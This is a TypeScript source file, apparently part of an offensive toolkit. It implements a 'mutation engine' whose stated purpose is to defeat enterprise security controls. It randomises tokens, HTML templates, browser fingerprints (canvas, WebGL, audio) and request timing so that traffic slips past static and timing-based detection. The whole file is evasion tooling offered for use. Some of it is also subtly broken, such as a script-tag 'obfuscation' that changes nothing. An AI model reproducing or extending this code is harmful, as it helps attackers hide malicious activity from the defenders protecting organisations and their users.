/**
 * MUTATION ENGINE
 * 
 * Advanced APT-level mutation system for:
 * - Token Mutation (dynamic token variation)
 * - Template Mutation (polymorphic templates)
 * - Fingerprint Mutation (fingerprint variation)
 * - Timing Mutation (timing pattern variation)
 * 
 * Purpose: Defeat enterprise security controls through dynamic mutation
 */

import crypto from 'crypto'

export interface MutationConfig {
  // Token mutation
  enableTokenMutation: boolean
  tokenMutationLevel: 'low' | 'medium' | 'high' | 'apt'
  
  // Template mutation
  enableTemplateMutation: boolean
  templateMutationLevel: 'low' | 'medium' | 'high' | 'apt'
  
  // Fingerprint mutation
  enableFingerprintMutation: boolean
  fingerprintMutationLevel: 'low' | 'medium' | 'high' | 'apt'
  
  // Timing mutation
  enableTimingMutation: boolean
  timingMutationLevel: 'low' | 'medium' | 'high' | 'apt'
  
  // Mutation schedule
  mutationInterval: number // Mutate every N requests
  mutationSeed?: string | number // Seed for consistent mutations
}

export interface MutationResult {
  // Token mutation
  tokenMutated: boolean
  originalToken?: string
  mutatedToken?: string
  tokenMutationTechnique?: string
  
  // Template mutation
  templateMutated: boolean
  originalTemplate?: string
  mutatedTemplate?: string
  templateMutationTechnique?: string
  
  // Fingerprint mutation
  fingerprintMutated: boolean
  originalFingerprint?: string
  mutatedFingerprint?: string
  fingerprintMutationTechnique?: string
  
  // Timing mutation
  timingMutated: boolean
  originalTiming?: number
  mutatedTiming?: number
  timingMutationTechnique?: string
  
  // Overall mutation status
  mutationsApplied: number
  mutationScore: number // 0-100 (higher = more mutations)
}

/**
 * Mutate token to avoid static token detection
 */
export function mutateToken(
  originalToken: string,
  level: 'low' | 'medium' | 'high' | 'apt' = 'medium'
): { mutatedToken: string; technique: string } {
  const techniques: string[] = []
  let mutated = originalToken

  // Level-based mutation intensity
  const mutationIntensity = {
    low: 0.05,    // 5% variation
    medium: 0.15, // 15% variation
    high: 0.30,  // 30% variation
    apt: 0.50,   // 50% variation
  }

  const intensity = mutationIntensity[level]

  // Technique 1: Add entropy suffix (preserves core token)
  if (level !== 'low') {
    const entropy = crypto.randomBytes(4).toString('hex')
    mutated = `${mutated}_${entropy}`
    techniques.push('entropy-suffix')
  }

  // Technique 2: Base64 encoding variation
  if (level === 'high' || level === 'apt') {
    try {
      const decoded = Buffer.from(mutated, 'base64').toString('utf-8')
      const modified = decoded + crypto.randomBytes(2).toString('hex')
      mutated = Buffer.from(modified).toString('base64')
      techniques.push('base64-variation')
    } catch {
      // Not base64, skip
    }
  }

  // Technique 3: Character substitution (subtle)
  if (level === 'apt') {
    const substitutions: Record<string, string> = {
      '0': 'O',
      '1': 'I',
      '5': 'S',
      '8': 'B',
    }
    let substituted = mutated
    for (const [from, to] of Object.entries(substitutions)) {
      if (Math.random() < intensity) {
        substituted = substituted.replace(new RegExp(from, 'g'), to)
        techniques.push('character-substitution')
      }
    }
    mutated = substituted
  }

  // Technique 4: Padding variation
  if (level === 'medium' || level === 'high' || level === 'apt') {
    const padding = crypto.randomBytes(2).toString('hex')
    mutated = `${mutated}${padding}`
    techniques.push('padding-variation')
  }

  return {
    mutatedToken: mutated,
    technique: techniques.join(', ') || 'none',
  }
}

/**
 * Mutate template to avoid static template detection
 */
export function mutateTemplate(
  originalTemplate: string,
  level: 'low' | 'medium' | 'high' | 'apt' = 'medium'
): { mutatedTemplate: string; technique: string } {
  const techniques: string[] = []
  let mutated = originalTemplate

  // Technique 1: HTML attribute reordering
  if (level !== 'low') {
    // Reorder attributes in HTML tags (preserves functionality)
    mutated = mutated.replace(
      /<(\w+)([^>]*)>/g,
      (match, tag, attrs) => {
        if (!attrs.trim()) return match
        const attrList = attrs.trim().split(/\s+/)
        const shuffled = [...attrList].sort(() => Math.random() - 0.5)
        techniques.push('attribute-reordering')
        return `<${tag} ${shuffled.join(' ')}>`
      }
    )
  }

  // Technique 2: Whitespace variation
  if (level === 'medium' || level === 'high' || level === 'apt') {
    mutated = mutated.replace(/>\s+</g, (match) => {
      const spaces = ' '.repeat(Math.floor(Math.random() * 3) + 1)
      techniques.push('whitespace-variation')
      return `>${spaces}<`
    })
  }

  // Technique 3: Comment injection
  if (level === 'high' || level === 'apt') {
    const comments = [
      '<!-- Generated content -->',
      '<!-- Dynamic template -->',
      '<!-- Version 1.0 -->',
    ]
    const comment = comments[Math.floor(Math.random() * comments.length)]
    mutated = mutated.replace('</head>', `${comment}\n</head>`)
    techniques.push('comment-injection')
  }

  // Technique 4: CSS class name variation
  if (level === 'apt') {
    const classMap: Record<string, string> = {}
    mutated = mutated.replace(/class="([^"]+)"/g, (match, classes) => {
      const classList = classes.split(' ')
      const mutatedClasses = classList.map((cls: string) => {
        if (!classMap[cls]) {
          classMap[cls] = `${cls}_${crypto.randomBytes(2).toString('hex')}`
        }
        return classMap[cls]
      })
      techniques.push('class-variation')
      return `class="${mutatedClasses.join(' ')}"`
    })
  }

  // Technique 5: Script tag obfuscation
  if (level === 'apt') {
    mutated = mutated.replace(/<script([^>]*)>/g, (match, attrs) => {
      const obfuscated = match.replace('script', 'scr' + 'ipt') // Split to avoid detection
      techniques.push('script-obfuscation')
      return obfuscated
    })
  }

  return {
    mutatedTemplate: mutated,
    technique: techniques.join(', ') || 'none',
  }
}

/**
 * Mutate fingerprint to avoid static fingerprinting
 */
export function mutateFingerprint(
  originalFingerprint: string,
  level: 'low' | 'medium' | 'high' | 'apt' = 'medium'
): { mutatedFingerprint: string; technique: string } {
  const techniques: string[] = []
  let mutated = originalFingerprint

  // Parse fingerprint (assuming JSON structure)
  let fingerprintData: any
  try {
    fingerprintData = typeof originalFingerprint === 'string'
      ? JSON.parse(originalFingerprint)
      : originalFingerprint
  } catch {
    // Not JSON, use hash-based mutation
    const hash = crypto.createHash('sha256').update(String(originalFingerprint)).digest('hex').slice(0, 16)
    const mutation = crypto.randomBytes(4).toString('hex')
    return {
      mutatedFingerprint: `${hash}_${mutation}`,
      technique: 'hash-mutation',
    }
  }

  // Level-based mutation intensity
  const mutationIntensity = {
    low: 0.05,
    medium: 0.15,
    high: 0.30,
    apt: 0.50,
  }

  const intensity = mutationIntensity[level]

  // Technique 1: Canvas fingerprint variation
  if (fingerprintData.canvas !== undefined) {
    const variation = (Math.random() - 0.5) * intensity * 0.1
    fingerprintData.canvas = (fingerprintData.canvas || 0) + variation
    techniques.push('canvas-variation')
  }

  // Technique 2: WebGL fingerprint variation
  if (fingerprintData.webgl !== undefined) {
    const variation = (Math.random() - 0.5) * intensity * 0.1
    fingerprintData.webgl = (fingerprintData.webgl || 0) + variation
    techniques.push('webgl-variation')
  }

  // Technique 3: Audio fingerprint variation
  if (fingerprintData.audio !== undefined) {
    const variation = (Math.random() - 0.5) * intensity * 0.1
    fingerprintData.audio = (fingerprintData.audio || 0) + variation
    techniques.push('audio-variation')
  }

  // Technique 4: Timing entropy injection
  if (level === 'high' || level === 'apt') {
    fingerprintData.timingEntropy = Date.now() % 1000 / 10000
    techniques.push('timing-entropy')
  }

  // Technique 5: Random component injection
  if (level === 'apt') {
    fingerprintData.mutationId = crypto.randomBytes(8).toString('hex')
    fingerprintData.mutationTimestamp = Date.now()
    techniques.push('component-injection')
  }

  const mutatedFingerprint = JSON.stringify(fingerprintData)
  return {
    mutatedFingerprint,
    technique: techniques.join(', ') || 'none',
  }
}

/**
 * Mutate timing patterns to avoid timing-based detection
 */
export function mutateTiming(
  baseTiming: number,
  level: 'low' | 'medium' | 'high' | 'apt' = 'medium'
): { mutatedTiming: number; technique: string } {
  const techniques: string[] = []
  let mutated = baseTiming

  // Level-based timing variation
  const timingVariations = {
    low: { min: 0.95, max: 1.05 },      // ±5%
    medium: { min: 0.85, max: 1.15 },  // ±15%
    high: { min: 0.70, max: 1.30 },    // ±30%
    apt: { min: 0.50, max: 1.50 },     // ±50%
  }

  const variation = timingVariations[level]

  // Technique 1: Multiplicative variation
  const multiplier = variation.min + Math.random() * (variation.max - variation.min)
  mutated = baseTiming * multiplier
  techniques.push('multiplicative-variation')

  // Technique 2: Additive jitter
  if (level === 'medium' || level === 'high' || level === 'apt') {
    const jitter = (Math.random() - 0.5) * baseTiming * 0.1
    mutated += jitter
    techniques.push('additive-jitter')
  }

  // Technique 3: Gaussian distribution
  if (level === 'high' || level === 'apt') {
    const u1 = Math.random()
    const u2 = Math.random()
    const z0 = Math.sqrt(-2 * Math.log(u1)) * Math.cos(2 * Math.PI * u2)
    const gaussianJitter = z0 * (baseTiming * 0.1)
    mutated += gaussianJitter
    techniques.push('gaussian-jitter')
  }

  // Technique 4: Exponential backoff variation
  if (level === 'apt') {
    const exponential = Math.exp((Math.random() - 0.5) * 0.2)
    mutated *= exponential
    techniques.push('exponential-variation')
  }

  // Ensure timing is positive
  mutated = Math.max(0, mutated)

  return {
    mutatedTiming: mutated,
    technique: techniques.join(', ') || 'none',
  }
}

/**
 * Complete mutation engine
 * Applies all mutations based on configuration
 */
export async function executeMutationEngine(
  context: {
    token?: string
    template?: string
    fingerprint?: string
    baseTiming?: number
    requestCount?: number
  },
  config: Partial<MutationConfig> = {}
): Promise<MutationResult> {
  const defaultConfig: MutationConfig = {
    enableTokenMutation: true,
    tokenMutationLevel: 'medium',
    enableTemplateMutation: true,
    templateMutationLevel: 'medium',
    enableFingerprintMutation: true,
    fingerprintMutationLevel: 'medium',
    enableTimingMutation: true,
    timingMutationLevel: 'medium',
    mutationInterval: 5,
    mutationSeed: context.fingerprint || Date.now(),
  }

  const finalConfig = { ...defaultConfig, ...config }
  const result: MutationResult = {
    tokenMutated: false,
    templateMutated: false,
    fingerprintMutated: false,
    timingMutated: false,
    mutationsApplied: 0,
    mutationScore: 0,
  }

  // Check if mutation should be applied (based on interval)
  const shouldMutate = (finalConfig.mutationSeed
    ? (typeof finalConfig.mutationSeed === 'number'
        ? finalConfig.mutationSeed
        : finalConfig.mutationSeed.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0))
    : (context.requestCount || 0)) % finalConfig.mutationInterval === 0

  if (!shouldMutate && (context.requestCount || 0) % finalConfig.mutationInterval !== 0) {
    // Random mutation (10% chance) to avoid patterns
    if (Math.random() < 0.1) {
      // Apply mutations anyway
    } else {
      return result // No mutations
    }
  }

  // ============================================
  // TOKEN MUTATION
  // ============================================
  if (finalConfig.enableTokenMutation && context.token) {
    const tokenResult = mutateToken(context.token, finalConfig.tokenMutationLevel)
    result.tokenMutated = true
    result.originalToken = context.token
    result.mutatedToken = tokenResult.mutatedToken
    result.tokenMutationTechnique = tokenResult.technique
    result.mutationsApplied++
  }

  // ============================================
  // TEMPLATE MUTATION
  // ============================================
  if (finalConfig.enableTemplateMutation && context.template) {
    const templateResult = mutateTemplate(context.template, finalConfig.templateMutationLevel)
    result.templateMutated = true
    result.originalTemplate = context.template
    result.mutatedTemplate = templateResult.mutatedTemplate
    result.templateMutationTechnique = templateResult.technique
    result.mutationsApplied++
  }

  // ============================================
  // FINGERPRINT MUTATION
  // ============================================
  if (finalConfig.enableFingerprintMutation && context.fingerprint) {
    const fingerprintResult = mutateFingerprint(context.fingerprint, finalConfig.fingerprintMutationLevel)
    result.fingerprintMutated = true
    result.originalFingerprint = context.fingerprint
    result.mutatedFingerprint = fingerprintResult.mutatedFingerprint
    result.fingerprintMutationTechnique = fingerprintResult.technique
    result.mutationsApplied++
  }

  // ============================================
  // TIMING MUTATION
  // ============================================
  if (finalConfig.enableTimingMutation && context.baseTiming !== undefined) {
    const timingResult = mutateTiming(context.baseTiming, finalConfig.timingMutationLevel)
    result.timingMutated = true
    result.originalTiming = context.baseTiming
    result.mutatedTiming = timingResult.mutatedTiming
    result.timingMutationTechnique = timingResult.technique
    result.mutationsApplied++
  }

  // Calculate mutation score
  result.mutationScore = (result.mutationsApplied / 4) * 100

  return result
}

/**
 * Get mutation schedule
 * Determines when mutations should be applied
 */
export function getMutationSchedule(
  requestCount: number,
  interval: number = 5
): { shouldMutate: boolean; nextMutation: number } {
  const shouldMutate = requestCount % interval === 0
  const nextMutation = interval - (requestCount % interval)

  return { shouldMutate, nextMutation }
}

/**
 * Generate mutation ID for tracking
 */
export function generateMutationId(): string {
  return `mut_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`
}

